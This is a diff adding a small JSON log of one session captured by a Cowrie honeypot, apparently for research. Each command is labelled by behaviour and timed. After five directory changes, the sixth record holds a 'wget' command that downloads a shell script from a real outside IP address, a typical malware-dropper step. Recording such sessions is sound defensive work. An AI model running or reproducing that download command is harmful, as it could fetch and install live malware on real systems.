@@ -1,0 +1,62 @@
+[
+  {
+    "index": 1,
+    "session_id": "1444ff39",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.28,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "1444ff39",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.37,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "1444ff39",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.15,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "1444ff39",
+    "cmd": "cd /root",
+    "cowrie_output": "",
+    "latency_ms": 8075.17,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "1444ff39",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.58,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "1444ff39",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "",
+    "latency_ms": 25076.67,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  }
+]
